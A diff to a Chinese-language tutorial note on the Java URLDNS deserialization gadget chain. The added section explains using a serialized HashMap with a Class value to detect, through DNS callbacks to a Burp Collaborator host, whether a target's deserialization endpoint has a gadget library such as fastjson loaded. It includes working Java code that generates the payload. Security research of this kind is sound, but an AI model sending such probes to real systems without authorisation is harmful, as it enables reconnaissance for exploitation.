@@ -1,3 +1,5 @@
+# URLDNS链
+
 Gadget：
 ```
 /**
@@ -174,3 +176,71 @@ public class GenURLDNS {
 
 }
 ```
+见于GenURLDNS.java。
+
+# URLDNS探测Class
+
+
+URLDNS链中，我们给HashMap增加key-value时，value可以是随意值，但实际上，如果value是一个class对象时，在HashMap反序列化时，会对key和value分别反序列化，反序列化流程大致如下：
+```java
+HashMap.readObject() -> s.readObject() 
+        ObjectInputStream.readObject -> readObject0 -> readClass -> readClassDesc -> readNonProxyDesc -> resolveClass
+            Class.forName()
+```
+
+其中，readObject0在解析反序列化数据后，判断是不是类，如果是，则readClass：
+```java
+private Object readObject0(boolean unshared) throws IOException {
+    ...
+    byte tc;
+    ....
+    switch (tc) {
+        ...
+        case TC_CLASS:
+            return readClass(unshared);
+    ....
+```
+最后一路运行下去，目的在于还原这个class，但如果这个类不存在，则会抛出：ClassNotFoundException，中断后面的所有代码运行流程，也就不会进行dns解析过程了。
+而如果这个类存在，能够成功加载类，代码就会正常运行下去，最后完成dns解析请求。
+
+因此这个思路可以用在黑盒场景下对目标反序列化接口的Gadget可用性探测。
+
+demo如下：
+```java
+URLStreamHandler URLStreamHanderObj = new URLStreamHandler() {
+    @Override
+    protected URLConnection openConnection(URL u) throws IOException {
+        return null;
+    }
+
+    @Override
+    protected int hashCode(URL u) {
+        return -1;
+    }
+};
+URL url = new URL(null, "http://13.389d0aj777taqlvgkm944affq6wwkl.burpcollaborator.net", URLStreamHanderObj);
+
+HashMap hashMap = new HashMap();
+hashMap.put(url, com.alibaba.fastjson.JSON.class);
+
+ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));
+objectOutputStream.writeObject(hashMap);
+```
+
+注意，在自己写代码实验时，应该用两台电脑（或两个项目）来分别完成HashMap序列化与反序列化调试。
+
+完整代码见于ScanClass.java，用这个代码测试可以在同一个项目上完成序列化与反序列化。只是需要一些手动修改：
+1. 实际测试时需要把序列化与反序列化分开测试。
+2. 序列化时，把ScanClass.java中这一行注释掉：
+```java
+unserial("JSON.ser");
+```
+3. 然后点击运行ScanClass#main()，此时会在项目根目录生成JSON.ser。
+4. 反序列化时，把pom.xml中fastjson的依赖注释掉，然后加载Maven更改，并把ScanClass.java中的这两行注释掉：
+```java
+serial("JSON.ser");
+// 和
+hashMap.put(url, com.alibaba.fastjson.JSON.class);
+```
+否则IDEA会编译不通过。
+5. 点击运行ScanClass#main()
